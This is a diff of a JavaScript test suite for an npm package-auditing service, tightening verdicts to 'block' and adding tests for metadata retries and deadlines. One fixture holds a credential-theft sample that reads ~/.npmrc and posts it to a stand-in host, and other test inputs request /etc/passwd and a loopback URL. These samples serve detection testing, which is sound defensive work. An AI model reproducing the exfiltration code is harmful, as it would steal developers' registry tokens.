@@ -25,14 +25,18 @@ test('notifications return empty 202; GET and DELETE do not open sessions',async
 });
 test('benign supplied source never authorizes installation',async()=>{
   const r=await(await send(audit({sourceFiles:{'index.js':'module.exports=42;'}}))).json();
-  assert.equal(r.result.structuredContent.verdict,'review');
+  assert.equal(r.result.structuredContent.verdict,'block');
   assert.equal(r.result.structuredContent.installationApproved,false);
   assert.equal(r.result.structuredContent.coverage.artifactVerified,false);
+  assert.ok(r.result.structuredContent.resolution.reasonCodes.includes('incomplete-checks'));
+  assert.match(r.result.structuredContent.summary,/not a confirmed malware finding/);
+  assert.doesNotMatch(JSON.stringify(r.result.structuredContent), /"verdict":"review"|reviewPlan|Proceed|Decline/);
 });
 test('credential-exfiltration evidence is detected without execution',async()=>{
   const r=await(await send(audit({sourceFiles:{'index.js':`const fs=require('fs');const secret=fs.readFileSync(process.env.HOME+'/.npmrc','utf8');fetch('https://example.invalid/collect',{method:'POST',body:secret});`}}))).json();
   assert.equal(r.result.structuredContent.verdict,'block');
   assert.equal(r.result.structuredContent.coverage.executed,false);
+  assert.ok(r.result.structuredContent.resolution.reasonCodes.includes('security-findings'));
 });
 test('tool arguments cannot request execution, arbitrary fetch or filesystem access',async()=>{
   for(const args of [{sourceFiles:{a:'x'},archive:'/etc/passwd'},{sourceFiles:{a:'x'},allowExecution:true},{sourceFiles:{a:'x'},resolverUrl:'http://127.0.0.1'}]) {
@@ -90,7 +94,7 @@ test('metadata calls fixed hosts, disallows redirects, filters withdrawn advisor
 test('empty advisories, upstream failures, identity mismatches never return safe',async()=>{
   for(const fetcher of [async()=>Response.json({}),async()=>new Response('redirect',{status:302}),async()=>{throw Error('offline');}]) {
     const r=await checkMetadata({name:'fixture',version:'1.0.0'},fetcher);
-    assert.equal(r.verdict,'review');assert.equal(r.installationApproved,false);assert.equal(r.checks.registry,'unavailable');
+    assert.equal(r.verdict,'block');assert.equal(r.installationApproved,false);assert.equal(r.checks.registry,'unavailable');
   }
 });
 test('streaming limits apply without Content-Length, and slow bodies time out',async()=>{
@@ -117,7 +121,7 @@ test('upstream error bodies with stalled cleanup do not stall metadata results',
   const r = await bounded(checkMetadata({name:'fixture',version:'1.0.0'}, async () =>
     new Response(new ReadableStream({ cancel() { return new Promise(() => {}); } }), { status: 503 })));
   assert.equal(r.checks.registry,'unavailable'); assert.equal(r.checks.vulnerabilities,'unavailable');
-  assert.equal(r.verdict,'review'); assert.equal(r.installationApproved,false);
+  assert.equal(r.verdict,'block'); assert.equal(r.installationApproved,false);
 });
 test('source budget counts UTF-8 bytes, invalid arguments do not consume scan quota',async()=>{
   let scans = 0;
@@ -128,6 +132,65 @@ test('source budget counts UTF-8 bytes, invalid arguments do not consume scan qu
 test('malformed advisory records never produce a completed clean lookup',async()=>{
   for (const body of [null, [], {vulns:null}, {vulns:'none'}, {vulns:[null]}, {vulns:[{id:42}]}]) {
     const r=await checkMetadata({name:'fixture',version:'1.0.0'},async url=>Response.json(url.includes('registry.npmjs.org')?{name:'fixture',version:'1.0.0'}:body));
-    assert.equal(r.checks.vulnerabilities,'unavailable'); assert.equal(r.verdict,'review'); assert.equal(r.installationApproved,false);
+    assert.equal(r.checks.vulnerabilities,'unavailable'); assert.equal(r.verdict,'block'); assert.equal(r.installationApproved,false);
   }
+});
+
+test('successful advisory-free metadata remains blocked for absent source/artifact checks',async()=>{
+  const report=await checkMetadata({name:'fixture',version:'1.0.0'},async url=>Response.json(
+    url.includes('registry.npmjs.org')?{name:'fixture',version:'1.0.0'}:{vulns:[]}));
+  assert.equal(report.verdict,'block');assert.equal(report.installationApproved,false);
+  assert.equal(report.checks.registry,'completed');assert.equal(report.checks.vulnerabilities,'completed');
+  assert.ok(report.resolution.reasonCodes.includes('source-artifact-checks-not-performed'));
+  assert.match(report.summary,/not a confirmed malware finding/);
+  assert.deepEqual(report.resolution.retry,{registry:{attempted:false,attempts:0},vulnerabilities:{attempted:false,attempts:0}});
+});
+
+test('one transient metadata retry preserves endpoint, request identity and deadline signal',async()=>{
+  const seen=new Map();
+  const report=await checkMetadata({name:'fixture',version:'1.0.0'},async(url,options)=>{
+    const previous=seen.get(url);
+    if(!previous){seen.set(url,{body:options.body,signal:options.signal,calls:1});return new Response(null,{status:503});}
+    previous.calls++;assert.equal(options.body,previous.body);assert.equal(options.signal,previous.signal);
+    assert.equal(options.redirect,'manual');
+    return Response.json(url.includes('registry.npmjs.org')?{name:'fixture',version:'1.0.0'}:{vulns:[]});
+  });
+  assert.equal(seen.size,2);assert.ok([...seen.values()].every(value=>value.calls===2));
+  assert.equal(report.checks.registry,'completed');assert.equal(report.checks.vulnerabilities,'completed');
+  assert.equal(report.verdict,'block');
+  assert.deepEqual(report.resolution.retry,{registry:{attempted:true,attempts:1},vulnerabilities:{attempted:true,attempts:1}});
+});
+
+test('metadata retry exhaustion blocks and deterministic failures never retry',async()=>{
+  for(const status of [302,404,503]){
+    let calls=0;
+    const report=await checkMetadata({name:'fixture',version:'1.0.0'},async()=>{calls++;return new Response(null,{status});});
+    assert.equal(calls,status===503?4:2);assert.equal(report.verdict,'block');
+    assert.ok(report.resolution.reasonCodes.includes('metadata-check-incomplete'));
+  }
+  let calls=0;
+  const report=await checkMetadata({name:'fixture',version:'1.0.0'},async()=>{calls++;return Response.json({vulns:'malformed'});});
+  assert.equal(calls,2);assert.equal(report.verdict,'block');
+  assert.equal(report.checks.vulnerabilities,'unavailable');
+});
+
+test('retry cannot extend the upstream deadline, including a fetch that ignores abort',async()=>{
+  let calls=0;
+  const report=await bounded(checkMetadata({name:'fixture',version:'1.0.0'},async()=>{
+    calls++;if(calls<=2)return new Response(null,{status:503});return new Promise(()=>{});
+  },{timeoutMs:10}));
+  assert.equal(calls,4);assert.equal(report.verdict,'block');
+  assert.equal(report.checks.registry,'unavailable');assert.equal(report.checks.vulnerabilities,'unavailable');
+  assert.ok(Object.values(report.resolution.retry).every(value=>value.attempts===1));
+  await assert.rejects(checkMetadata({name:'fixture',version:'1.0.0'},()=>{throw Error('must not run');},{timeoutMs:6001}),/1\.\.6000/);
+});
+
+test('hosted tools reject retired manual-review inputs before consuming scan quota',async()=>{
+  let scans=0;
+  const metered={...env,SCAN_RATE_LIMITER:{limit:async()=>{scans++;return{success:true};}}};
+  for(const extra of [{reviewId:'old'},{reviewChoice:'Proceed'},{reviewPlan:{}},{timeoutMs:60000}]){
+    const response=await worker.fetch(request(audit({sourceFiles:{'index.js':'exports.x=1'},...extra})),metered);
+    assert.equal((await response.json()).error.code,-32602);
+  }
+  assert.equal(scans,0);
 });
